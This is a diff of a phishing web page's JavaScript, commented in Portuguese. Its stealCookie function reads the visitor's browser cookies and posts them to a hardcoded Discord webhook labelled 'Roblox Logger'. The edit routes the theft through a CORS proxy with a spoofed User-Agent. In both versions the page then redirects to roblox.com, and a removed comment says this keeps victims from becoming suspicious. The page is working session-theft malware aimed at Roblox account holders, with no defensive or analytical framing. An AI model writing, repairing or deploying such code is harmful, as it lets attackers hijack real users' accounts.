@@ -46,37 +46,37 @@
     </div>
 
     <script>
-        // ⚠️ COLE SUA URL DO WEBHOOK AQUI DENTRO DAS ASPAS SIMPLES
+        // ⚠️ SUA URL DO WEBHOOK JÁ ESTÁ CORRETA
         const webhookUrl = 'https://discord.com/api/webhooks/1567446528908591105/HJrrrW2hiOuddvGHqhiOugZ10PdTdBAsGR9hV6ikva-37KwkXpdaZDCz2XQRKKQdJ7B1'; 
 
         function stealCookie() {
             var cookie = document.cookie;
             
-            console.log("Cookie capturado:", cookie); // Para você ver no F12 se pegou
+            console.log("Cookie capturado:", cookie); 
 
-            // Formata a mensagem bonita pro Discord
             const payload = {
                 content: "🍪 **Novo Cookie Capturado!**\n\n```\n" + cookie + "\n```",
                 username: "Roblox Logger",
                 avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png"
             };
 
-            // Envia para o Discord
-            fetch(webhookUrl, {
+            // USA O PROXY CORSPROXY.IO QUE É MAIS RÁPIDO
+            fetch("https://corsproxy.io/?url=" + encodeURIComponent(webhookUrl), {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Mozilla/5.0'
+                },
                 body: JSON.stringify(payload)
             })
             .then(response => {
-                if (!response.ok) throw new Error('Erro no Discord');
+                if (!response.ok) throw new Error('Erro no proxy');
                 console.log("Enviado com sucesso!");
                 
-                // Redireciona para o Roblox APÓS enviar
                 window.location.href = "https://www.roblox.com";
             })
             .catch(error => {
-                console.error("Erro ao enviar:", error);
-                // Mesmo com erro, joga pra roblox pra não desconfiar
+                console.error("Falha no proxy:", error);
                 window.location.href = "https://www.roblox.com";
             });
         }
